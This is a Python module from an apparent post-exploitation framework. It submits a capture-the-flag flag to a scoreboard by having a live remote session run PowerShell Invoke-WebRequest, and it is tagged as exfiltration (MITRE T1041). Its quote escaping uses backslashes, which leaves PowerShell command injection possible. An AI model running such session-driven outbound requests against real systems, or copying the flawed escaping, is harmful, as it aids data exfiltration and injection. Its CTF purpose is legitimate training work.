"""exfiltration/flag_submit — CTF flag submitter via HTTP POST/GET. MITRE T1041"""
import json
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class FlagSubmit(BasePlugin):
    NAME        = "flag_submit"
    DESCRIPTION = "Submit a CTF flag to a scoreboard URL; detects correct/wrong/already-submitted."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1041"
    CATEGORY    = "exfiltration"
    schema      = ParamSchema().add(
        Param("url",        str, required=True,
              help="Scoreboard submission URL"),
        Param("flag",       str, required=True,
              help="Flag string to submit"),
        Param("field_name", str, required=False, default="flag",
              help="Form field name for the flag"),
        Param("method",     str, required=False, default="POST",
              help="HTTP method: POST or GET"),
        Param("token",      str, required=False, default="",
              help="Bearer token for Authorization header (leave empty to skip)"),
    )

    @mitre("T1041")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        url        = params["url"].replace("'", "\\'")
        flag       = params["flag"].replace("'", "\\'")
        field_name = params.get("field_name", "flag").replace("'", "\\'")
        method     = params.get("method", "POST").upper()
        token      = params.get("token", "")

        # Build PowerShell that sends the request and inspects the response
        auth_header = ""
        if token:
            safe_token = token.replace("'", "\\'")
            auth_header = f"$headers['Authorization'] = 'Bearer {safe_token}';"

        if method == "GET":
            ps = (
                "$headers = @{};"
                + auth_header
                + f"$uri = '{url}?{field_name}={flag}';"
                "$resp = try {"
                "  Invoke-WebRequest -Uri $uri -Headers $headers -UseBasicParsing -EA Stop;"
                "} catch {"
                "  [PSCustomObject]@{StatusCode=$_.Exception.Response.StatusCode.value__;"
                "    Content=$_.Exception.Response}"
                "};"
                "$body = if ($resp.Content) { $resp.Content } else { '' };"
                "Write-Output \"HTTP $($resp.StatusCode)\";"
                "Write-Output $body;"
            )
        else:  # POST
            ps = (
                "$headers = @{'Content-Type'='application/x-www-form-urlencoded'};"
                + auth_header
                + f"$body = '{field_name}={flag}';"
                f"$uri = '{url}';"
                "$resp = try {"
                "  Invoke-WebRequest -Uri $uri -Method POST -Headers $headers -Body $body"
                "    -UseBasicParsing -EA Stop;"
                "} catch {"
                "  [PSCustomObject]@{StatusCode=$_.Exception.Response.StatusCode.value__;"
                "    Content=$_.Exception.Response}"
                "};"
                "$respBody = if ($resp.Content) { $resp.Content } else { '' };"
                "Write-Output \"HTTP $($resp.StatusCode)\";"
                "Write-Output $respBody;"
            )

        r = ctx.ps(ps)
        if r["status"] not in ("ok", "error"):
            return ModuleResult.err("Dispatch failed")

        output = r.get("output", "")

        # Parse response keywords
        low = output.lower()
        if any(w in low for w in ("correct", "right", "accepted", "valid flag", "congrats", "well done", "solve")):
            verdict = "CORRECT"
        elif any(w in low for w in ("already", "duplicate", "resubmit", "already submitted")):
            verdict = "ALREADY_SUBMITTED"
        elif any(w in low for w in ("wrong", "incorrect", "invalid", "bad flag", "nope")):
            verdict = "WRONG"
        else:
            verdict = "UNKNOWN"

        result_data = {
            "url":     params["url"],
            "flag":    params["flag"],
            "verdict": verdict,
            "response": output[:2000],
        }

        return ModuleResult.ok(
            data=result_data,
            loot_kind="flag",
            loot_label=f"{verdict}: {params['flag']}",
        )
